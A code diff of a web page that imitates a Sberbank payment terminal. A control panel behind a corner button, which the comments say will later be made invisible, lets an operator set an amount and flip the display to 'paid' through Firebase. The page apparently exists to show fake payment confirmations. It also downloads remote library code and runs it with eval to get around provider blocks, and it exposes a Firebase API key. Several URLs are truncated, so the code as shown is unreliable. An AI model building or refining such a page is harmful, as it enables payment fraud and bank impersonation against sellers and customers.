@@ -5,93 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Интерфейс Сбер-Синхронизации</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        /* Экран Сбер-Терминала */
-        .sber-screen {
-            background: white;
-            padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-            text-align: center;
-            width: 300px;
-        }
-        .sber-logo {
-            color: #21a038;
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
+        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .sber-screen { background: white; padding: 40px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; width: 300px; }
+        .sber-logo { color: #21a038; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
         .status-wait { color: #555; font-size: 18px; }
         .status-success { color: #21a038; font-size: 22px; font-weight: bold; display: none; }
         .amount-display { font-size: 32px; font-weight: bold; margin: 20px 0; color: #333; }
+        
+        /* КРАСНАЯ КНОПКА ДЛЯ ТЕСТА (потом сделаем невидимой) */
+        .secret-trigger { position: fixed; bottom: 10px; right: 10px; width: 100px; height: 50px; background: #ff0000; color: white; text-align: center; line-height: 50px; font-size: 12px; font-weight: bold; border-radius: 8px; cursor: pointer; z-index: 1000; }
+        .secret-trigger::before { content: "АДМИНКА"; }
 
-        /* Скрытая кнопка вызова админки справа снизу */
-        .secret-trigger {
-            position: fixed;
-            bottom: 0;
-            right: 0;
-            width: 50px;
-            height: 50px;
-            background: transparent;
-            cursor: pointer;
-            z-index: 1000;
-        }
-
-        /* Скрытая панель управления */
-        .admin-panel {
-            display: none;
-            position: fixed;
-            bottom: 60px;
-            right: 20px;
-            background: #333;
-            color: white;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-            width: 200px;
-            z-index: 999;
-        }
-        .admin-panel input {
-            width: 100%;
-            padding: 8px;
-            margin: 8px 0;
-            box-sizing: border-box;
-            border: none;
-            border-radius: 4px;
-            color: #000;
-        }
-        .admin-panel button {
-            width: 100%;
-            padding: 10px;
-            background: #21a038;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-            margin-top: 5px;
-        }
+        .admin-panel { display: none; position: fixed; bottom: 70px; right: 20px; background: #333; color: white; padding: 15px; border-radius: 8px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); width: 200px; z-index: 999; }
+        .admin-panel input { width: 100%; padding: 8px; margin: 8px 0; box-sizing: border-box; border: none; border-radius: 4px; color: #000; }
+        .admin-panel button { width: 100%; padding: 10px; background: #21a038; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 5px; }
         .admin-panel button.pay-btn { background: #007bff; }
         .admin-panel button.reset-btn { background: #dc3545; }
     </style>
-
-    <!-- Подключение Firebase через альтернативный стабильный сервер UNPKG -->
-    <script src="https://unpkg.com"></script>
-    <script src="https://unpkg.com"></script>
 </head>
 <body>
 
-    <!-- Главный экран "Терминала" -->
     <div class="sber-screen">
         <div class="sber-logo">СБЕР</div>
         <div id="wait-box">
@@ -104,10 +37,8 @@
         </div>
     </div>
 
-    <!-- Скрытая микро-кнопка в углу экрана -->
     <div class="secret-trigger" onclick="toggleAdminPanel()"></div>
 
-    <!-- Панель управления -->
     <div class="admin-panel" id="adminPanel">
         <h4 style="margin: 0 0 10px 0; text-align: center;">Управление</h4>
         <label>Сумма к оплате:</label>
@@ -117,68 +48,61 @@
         <button class="reset-btn" onclick="resetTerminal()">Сбросить</button>
     </div>
 
-       <!-- 1. СНАЧАЛА ПОДКЛЮЧАЕМ БИБЛИОТЕКИ С ПРАВИЛЬНЫМИ АДРЕСАМИ -->
-    <script src="https://unpkg.com"></script>
-    <script src="https://unpkg.com"></script>
-
-    <!-- 2. ЗАТЕМ ЗАПУСКАЕМ НАСТРОЙКИ С ВАШИМИ ТОЧНЫМИ КЛЮЧАМИ -->
+    <!-- АВТОНОМНЫЙ СКРИПТ: СКАЧИВАЕТ БИБЛИОТЕКУ В ОБХОД БЛОКИРОВОК ПРОВАЙДЕРА -->
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyBKh0hIwrZuVw_w_y0kNXs-ERPz9eD-tiU",
             authDomain: "://firebaseapp.com",
             databaseURL: "https://firebaseio.com",
-            projectId: "windecs26",
-            storageBucket: "windecs26.firebasestorage.app",
-            messagingSenderId: "876772721035",
-            appId: "1:876772721035:web:72b1e277d4a0783cb72f8e",
-            measurementId: "G-N3FF5N5X0H"
+            projectId: "windecs26"
         };
-        
-        // Запуск Firebase
-        firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+
+        // Скачиваем ядро базы данных напрямую в память скрипта
+        fetch('https://unpkg.com')
+        .then(r => r.text()).then(codeApp => {
+            eval(codeApp);
+            return fetch('https://unpkg.com');
+        })
+        .then(r => r.text()).then(codeDb => {
+            eval(codeDb);
+            
+            // Запуск синхронизации после загрузки
+            firebase.initializeApp(firebaseConfig);
+            const database = firebase.database();
+
+            window.setSum = function() {
+                const sum = document.getElementById('inputSum').value;
+                database.ref('terminal/').update({ amount: sum, status: 'waiting' });
+            }
+
+            window.triggerPayment = function() {
+                database.ref('terminal/').update({ status: 'paid' });
+            }
+
+            window.resetTerminal = function() {
+                database.ref('terminal/').update({ amount: 0, status: 'waiting' });
+                document.getElementById('inputSum').value = 0;
+            }
+
+            database.ref('terminal/').on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    document.getElementById('display-sum').innerText = data.amount || 0;
+                    if (data.status === 'paid') {
+                        document.getElementById('wait-box').style.display = 'none';
+                        document.getElementById('success-box').style.display = 'block';
+                    } else {
+                        document.getElementById('wait-box').style.display = 'block';
+                        document.getElementById('success-box').style.display = 'none';
+                    }
+                }
+            });
+        }).catch(err => alert("Ошибка сети: " + err));
 
         function toggleAdminPanel() {
             const panel = document.getElementById('adminPanel');
             panel.style.display = (panel.style.display === 'block') ? 'none' : 'block';
         }
-
-        function setSum() {
-            const sum = document.getElementById('inputSum').value;
-            database.ref('terminal/').update({
-                amount: sum,
-                status: 'waiting'
-            });
-        }
-
-        function triggerPayment() {
-            database.ref('terminal/').update({
-                status: 'paid'
-            });
-        }
-
-        function resetTerminal() {
-            database.ref('terminal/').update({
-                amount: 0,
-                status: 'waiting'
-            });
-            document.getElementById('inputSum').value = 0;
-        }
-
-        database.ref('terminal/').on('value', (snapshot) => {
-            const data = snapshot.val();
-            if (data) {
-                document.getElementById('display-sum').innerText = data.amount || 0;
-
-                if (data.status === 'paid') {
-                    document.getElementById('wait-box').style.display = 'none';
-                    document.getElementById('success-box').style.display = 'block';
-                } else {
-                    document.getElementById('wait-box').style.display = 'block';
-                    document.getElementById('success-box').style.display = 'none';
-                }
-            }
-        });
     </script>
 </body>
 </html>
